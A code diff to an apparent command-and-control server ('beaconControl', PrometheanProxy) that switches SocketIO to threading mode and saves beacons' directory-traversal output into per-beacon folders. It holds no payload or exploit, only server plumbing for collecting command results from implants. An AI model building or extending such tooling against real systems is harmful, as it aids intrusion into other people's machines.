@@ -1,14 +1,20 @@
 from flask import Flask, request, jsonify, redirect
 import uuid
+import os
 import time
 import logging
+
 from flask_socketio import SocketIO
 from Modules.global_objects import (
     beacon_list, command_list, config, logger)
 from Modules.beacon import add_beacon_list
 
 beaconControl = Flask(__name__)
-socketio = SocketIO(beaconControl, cors_allowed_origins="*")
+socketio = SocketIO(
+    beaconControl,
+    cors_allowed_origins="*",
+    async_mode="threading"
+)
 log = logging.getLogger('werkzeug')
 beaconControl.logger.setLevel(logging.ERROR)
 log.setLevel(logging.ERROR)
@@ -163,10 +169,13 @@ def response(path1, version):
             found = True
             command.command_output = output
             if command.command == "directory_traversal":
-                # need to handle this properly
                 print("Directory Traversal Responded, saved to file")
                 logger.info(f"Directory Traversal command {command.beacon_uuid} responded with output, saving to file")
-                with open("directory_traversal.json", "w") as f:
+                if not os.path.exists(os.path.expanduser(f"~/.PrometheanProxy/{command.beacon_uuid}")):
+                    logger.info(f"Creating directory for beacon UUID: {command.beacon_uuid}")
+                    os.makedirs(os.path.expanduser(f"~/.PrometheanProxy/{command.beacon_uuid}"))
+                with open(os.path.expanduser(f"~/.PrometheanProxy/{command.beacon_uuid}/directory_traversal.json"), "w") as f:
+                    logger.info(f"Writing directory traversal output to file for beacon UUID: {command.beacon_uuid}")
                     f.write(output)
             else:
                 print(
